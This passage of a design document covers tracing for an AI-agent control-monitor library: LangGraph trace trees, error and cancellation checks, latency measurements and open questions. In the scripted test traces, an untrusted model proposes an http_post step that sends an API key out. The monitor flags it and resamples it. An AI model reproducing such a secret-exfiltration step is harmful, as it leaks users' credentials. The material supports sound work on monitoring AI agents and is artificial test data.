        outputs: {"outcome": "resampled", "flagged": false, "blocked_count": 0, "samples": [{"suspicion": 0.9, "executed": false}, {"suspicion": 0.9, "executed": false}, {"suspicion": 0.05, "executed": true}]}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
          outputs: {"suspicion": 0.9, "reason": "Looked at the step."}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.9}}
        - ContentKeyedJudge [llm] ok tags=['nostream'] metadata={"lc_source": "llm_monitor"}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 2 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
          outputs: {"suspicion": 0.9, "reason": "Looked at the step."}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.9}}
        - ContentKeyedJudge [llm] ok tags=['nostream'] metadata={"lc_source": "llm_monitor"}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 3 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"read_file\">{\"path\": \"q3.md\"}</too...
          outputs: {"suspicion": 0.05, "reason": "The decision model's strongest concern is 'suspicious_step': Is the proposed step at the end of the transcript part of an attack on the user or their systems, or an a...
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.05}}
  - monitor[main].after_model [chain] ok
  - tools [chain] ok
    - read_file [tool] ok
  - model [chain] ok
    - monitor[main] step 2 [chain] ok metadata={"monitor": "monitor", "agent": "main", "step_number": 2, "delegation_id": null}
        inputs:  {"proposal": "<proposed_step>\n<agent>Q3 revenue rose 4%.</agent>\n</proposed_step>"}
        outputs: {"outcome": "allowed", "flagged": false, "blocked_count": 0, "samples": [{"suspicion": 0.05, "executed": true}]}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 2, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<agent>Q3 revenue rose 4%.</agent>\n</proposed_step>"}
          outputs: {"suspicion": 0.05, "reason": "The decision model's strongest concern is 'suspicious_step': Is the proposed step at the end of the transcript part of an attack on the user or their systems, or an a...
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n<tool_call name=\"...
            outputs: {"answers": {"suspicious_step": 0.05}}
  - monitor[main].after_model [chain] ok
checks passed: 2 step spans, 23 runs, every run ended
recording handler: every parent known, every run ended
```

The script asserts that every run has an `end_time` and that each step span's
parent is `model`. It also asserts that each judgement's parent is a step
span, each `OpenRouterDecisionModel` and judge run's parent is a judgement,
and each untrusted `ScriptedChatModel` run's parent is a step span. The
recording handler, attached alongside, finds no unknown parent and no
unended run. The prototype writes `"delegation_id": null`; the design leaves
the key out until #37.

### `run_prototype.py`: `ainvoke` with parallel resampling

```text
=== ainvoke (parallel resampling) ===
- LangGraph [chain] ok
  - model [chain] ok
    - monitor[main] step 1 [chain] ok metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
        outputs: {"outcome": "resampled", "flagged": false, "blocked_count": 0, "samples": [{"suspicion": 0.9, "executed": false}, {"suspicion": 0.9, "executed": false}, {"suspicion": 0.05, "executed": true}]}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
          outputs: {"suspicion": 0.9, "reason": "Looked at the step."}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.9}}
        - ContentKeyedJudge [llm] ok tags=['nostream'] metadata={"lc_source": "llm_monitor"}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 2 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
          outputs: {"suspicion": 0.9, "reason": "Looked at the step."}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.9}}
        - ContentKeyedJudge [llm] ok tags=['nostream'] metadata={"lc_source": "llm_monitor"}
      - judgement 3 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"read_file\">{\"path\": \"q3.md\"}</too...
          outputs: {"suspicion": 0.05, "reason": "The decision model's strongest concern is 'suspicious_step': Is the proposed step at the end of the transcript part of an attack on the user or their systems, or an a...
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n</transcript>\n<pr...
            outputs: {"answers": {"suspicious_step": 0.05}}
  - monitor[main].after_model [chain] ok
  - tools [chain] ok
    - read_file [tool] ok
  - model [chain] ok
    - monitor[main] step 2 [chain] ok metadata={"monitor": "monitor", "agent": "main", "step_number": 2, "delegation_id": null}
        inputs:  {"proposal": "<proposed_step>\n<agent>Q3 revenue rose 4%.</agent>\n</proposed_step>"}
        outputs: {"outcome": "allowed", "flagged": false, "blocked_count": 0, "samples": [{"suspicion": 0.05, "executed": true}]}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 2, "delegation_id": null}
          inputs:  {"proposal": "<proposed_step>\n<agent>Q3 revenue rose 4%.</agent>\n</proposed_step>"}
          outputs: {"suspicion": 0.05, "reason": "The decision model's strongest concern is 'suspicious_step': Is the proposed step at the end of the transcript part of an attack on the user or their systems, or an a...
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
            inputs:  {"state": "<transcript>\n<user>Summarise q3.md for the team.</user>\n<tool_call name=\"...
            outputs: {"answers": {"suspicious_step": 0.05}}
  - monitor[main].after_model [chain] ok
checks passed: 2 step spans, 23 runs, every run ended
recording handler: every parent known, every run ended
```

The two parallel resamples appear as two untrusted LLM runs started
together, each followed by its own judgement.

### `run_checks.py`: streams, errors, cancellation, LangSmith, Deep Agents

Long lines are cut at 200 characters.

```text
=== streams: baseline MonitorMiddleware vs traced ===
invoke: every messages/updates/custom part identical, full payloads and metadata minus ids ({'custom': 2, 'messages': 3, 'updates': 5})
ainvoke: every messages/updates/custom part identical, full payloads and metadata minus ids ({'custom': 2, 'messages': 3, 'updates': 5})
stream_events v3 run.messages identical, full messages minus ids (2 messages)
astream_events v2, events added by spans: {'on_chain_start': 6, 'on_llm_start': 4, 'on_llm_end': 4, 'on_chain_end': 6}
  Decisions span event: on_llm_end data keys ['input', 'output'] output={'answers': {'suspicious_step': 0.9}}
  judgement event parent_ids length 3, output={'suspicion': 0.9, 'reason': 'Looked at the step.'}
  on_chat_model_start events unchanged

=== a judge that raises ===
--- judge raises TimeoutError under invoke: raised TimeoutError: judge provider timed out
- LangGraph [chain] ERROR During task with name 'model' and id '6aa286c9-32c6-2ddd-635
  - model [chain] ERROR TimeoutError: judge provider timed out
    - monitor[main] step 1 [chain] ERROR TimeoutError: judge provider timed out metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ERROR TimeoutError: judge provider timed out tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
        - ContentKeyedJudge [llm] ERROR TimeoutError: judge provider timed out tags=['nostream'] metadata={"lc_source": "llm_monitor"}
runs never ended: none; errors by run: {'LangGraph': "During task with name 'model' and id '6aa286c9-32c6-2ddd-635e-ead5e5d87b5d'", 'model': 'TimeoutError: judge provider timed out', 'monitor[main]...

--- judge raises TimeoutError under ainvoke: raised TimeoutError: judge provider timed out
- LangGraph [chain] ERROR During task with name 'model' and id '98057aac-2566-7c1b-179
  - model [chain] ERROR TimeoutError: judge provider timed out
    - monitor[main] step 1 [chain] ERROR TimeoutError: judge provider timed out metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ERROR TimeoutError: judge provider timed out tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
        - ContentKeyedJudge [llm] ERROR TimeoutError: judge provider timed out tags=['nostream'] metadata={"lc_source": "llm_monitor"}
runs never ended: none; errors by run: {'LangGraph': "During task with name 'model' and id '98057aac-2566-7c1b-179d-74a15142cc79'", 'model': 'TimeoutError: judge provider timed out', 'monitor[main]...

=== one parallel draw fails while a sibling is inside its judgement ===
--- parallel draw fails under ainvoke: raised RuntimeError: provider returned 500
- LangGraph [chain] ERROR During task with name 'model' and id '04fb4443-a8b0-113b-600
  - model [chain] ERROR RuntimeError: provider returned 500
    - monitor[main] step 1 [chain] ERROR RuntimeError: provider returned 500 metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
      - FlakyChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
        - ContentKeyedJudge [llm] ok tags=['nostream'] metadata={"lc_source": "llm_monitor"}
      - FlakyChatModel [llm] ok tags=['nostream']
      - FlakyChatModel [llm] ERROR RuntimeError: provider returned 500 tags=['nostream']
      - judgement 2 [chain] ERROR asyncio.exceptions.CancelledError tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        - OpenRouterDecisionModel [llm] ok tags=['nostream'] metadata={"lc_source": "decision_model_monitor", "ls_model_name": "typesafe/jev"}
        - ContentKeyedJudge [llm] OPEN, never ended tags=['nostream'] metadata={"lc_source": "llm_monitor"}
runs never ended: ['ContentKeyedJudge']; errors by run: {'LangGraph': "During task with name 'model' and id '04fb4443-a8b0-113b-6008-e747d1193b82'", 'model': 'RuntimeError: provider returned 500', ...

=== a protocol that awaits real async work under invoke() ===
--- SynchronousRunError under invoke: raised SynchronousRunError: A control protocol awaited real asynchronous work during a synchronous invoke(). Under invoke() a protocol may await only the pendi...
- LangGraph [chain] ERROR During task with name 'model' and id 'd01f3723-fb11-faa8-af9
  - model [chain] ERROR langchain_sync_monitors.errors.SynchronousRunError: A contro
    - monitor[main] step 1 [chain] ERROR langchain_sync_monitors.errors.SynchronousRunError: A contro metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
      - ScriptedChatModel [llm] ok tags=['nostream']
      - judgement 1 [chain] ok tags=['nostream'] metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
runs never ended: none; errors by run: {'LangGraph': "During task with name 'model' and id 'd01f3723-fb11-faa8-af91-b46729d7de1b'", 'model': "langchain_sync_monitors.errors.SynchronousRunError: A c...

=== LangSmith tracing enabled (mock client) with a second, plain handler ===
MonitorMiddleware: runs whose parent the plain handler never saw: ['ScriptedChatModel -> parent 01a0ee0e-0b9a-7662-b67b-af1d52f24839', 'ScriptedChatModel -> parent 01a0ee0e-0b9d-7703-929b-64422733a...
  runs LangSmith received: ['LangGraph', 'ScriptedChatModel', 'model', 'monitor[main].after_model', 'monitor[main].wrap_model_call', 'read_file', 'tools']
TracedMonitorMiddleware: runs whose parent the plain handler never saw: ['monitor[main] step 1 -> parent 01a0ee0e-0ba3-7943-9019-4f569df4cb27', 'monitor[main] step 2 -> parent 01a0ee0e-0ba5-7483-b7...
  runs LangSmith received: ['LangGraph', 'ScriptedChatModel', 'judgement 1', 'model', 'monitor[main] step 1', 'monitor[main] step 2', 'monitor[main].after_model', 'monitor[main].wrap_model_call', '...

=== Deep Agents: a monitored worker subagent (invoke) ===
monitor[main] step 1: ancestors model < LangGraph
    metadata agent=main lc_agent_name=None checkpoint_ns=model:240d2509-83c5-1766-3ff5-cb6ba2574432
monitor[worker] step 1: ancestors model < worker < task < tools < LangGraph
    metadata agent=worker lc_agent_name=worker checkpoint_ns=tools:28315e64-983a-17f6-4d31-a5afcb941d55
monitor[worker] step 2: ancestors model < worker < task < tools < LangGraph
    metadata agent=worker lc_agent_name=worker checkpoint_ns=tools:28315e64-983a-17f6-4d31-a5afcb941d55
monitor[main] step 2: ancestors model < LangGraph
    metadata agent=main lc_agent_name=None checkpoint_ns=model:e6d11484-f6f4-5104-85ab-b60ba54559d0
every parent known, every run ended
```

The mock LangSmith client also shows the step span created with `inputs={}`
and patched with `inputs={"proposal": ...}` and the four output keys.

### Other measurements

```text
async RunnableLambda under run_synchronously: SynchronousRunError - A control protocol awaited real asynchronous work ...
  (plus "RuntimeWarning: coroutine 'AsyncCallbackManagerForChainRun.on_chain_error' was never awaited")
RunnableLambda built per call and invoked: 33.7 us

# final run, with the no-handler short-circuit, machine under other load
sync, no handlers: 7.5 us
sync, one BaseTracer handler: 43.6 us
async, no handlers: 4.9 us
for scale, one fake chat model invoke, no handlers: 59.4 us
invoke  tracer=False: baseline 2.89 ms, traced 3.64 ms per two-step run, +0.75 ms (26%)
invoke  tracer=True : baseline 2.75 ms, traced 3.16 ms per two-step run, +0.41 ms (15%)
ainvoke tracer=False: baseline 5.21 ms, traced 5.73 ms per two-step run, +0.51 ms (10%)
ainvoke tracer=True : baseline 10.12 ms, traced 13.59 ms per two-step run, +3.46 ms (34%)
```

## Open questions

1. **The step span's input.**
   - Recommended: `{}` at start, replaced at the end by the first sample's
     rendered proposal. LangSmith, Langfuse, BaseTracer and `astream_events`
     all accept `inputs=` at the end, but a live trace shows an empty input
     until the step ends.
   - Alternative: at start, put the latest request message (what the step
     answers). That duplicates the untrusted LLM run's input.
2. **Per-judgement or per-sample spans.**
   - With judgement spans only, the untrusted sample's LLM run is a sibling
     of its judgement. With parallel draws, the pairing is by order: draw 2's
     model call and `judgement 2`.
   - A `sample N` span wrapping both would make the pairing explicit, at one
     more level of nesting.
   - The brief asks for judgements; decide before implementing.
3. **Decisions span type.**
   - The recommendation is a chain start with `run_type="llm"`, identical to
     `TypeSafeClassifier`.
   - It shows as a chain in Langfuse and gives chain-shaped `on_llm_*` events
     in `astream_events`.
   - The alternative is `on_llm_start`/`on_llm_end` with an `LLMResult`: a
     Langfuse generation with model and usage, but a text output.
   - Also decide whether to read the response's `usage` leniently for tracing
     only. `DecisionsResponse` ignores it on purpose today. It could be
     recorded as `usage_metadata` in the outputs.
4. **Retries inside the Decisions span.** `@stamina.retry` hides the attempt
   count. `stamina.retry_context` would let the span record attempts, or add
   one child span per attempt.
5. **A switch.**
   - Recommended: none for 0.1.0, beyond skipping when there are no handlers.
   - Honouring `self.trace_policy` would give users LangChain's own knob:
     apply `process_inputs`/`process_outputs` to our span payloads, for
     example `omit_payload` to drop proposals. It is optional.
   - A `trace_decisions` flag is simpler but new.
6. **LangSmith `@traceable` code inside a monitor.**
   - A custom monitor decorated with `@traceable`, or code calling
     `get_current_run_tree()`, sees the LangSmith tracing-context parent. That
     parent is the `wrap_model_call` hook span, not our span, because we do
     not call `_set_config_context`.
   - Setting the LangSmith context would need private APIs. Leave it, and
     document it.
7. **`nostream` on judgement spans.** It is cosmetic. The helper could pass
   the config's tags minus `TAG_NOSTREAM` as the span's own tags, while the
   child config keeps it.
8. **Names.**
   - `judgement 1` relies on the tree for context. `monitor[main] step 3
     judgement 1` is unique in flat run lists.
   - Langfuse types any chain whose name contains "agent" as an `agent`
     observation, for example `monitor[research-agent] step 1`.
9. **Metadata inheritance.** Should `monitor`, `agent` and `step_number` also
   be inheritable, so the untrusted and judge LLM runs of a step can be
   filtered by them? Local is recommended, to leave child runs as LangChain
   makes them.
10. **Spans inside monitor wrappers.** `RepeatedMonitor` repeats and
    `CascadeMonitor` stages could get their own spans. Out of scope for
    0.1.0.
11. **Delegation id.** Blocked on #37. Until it lands, the ancestor `task`
    tool run carries `tool_call_id` in every tracer.
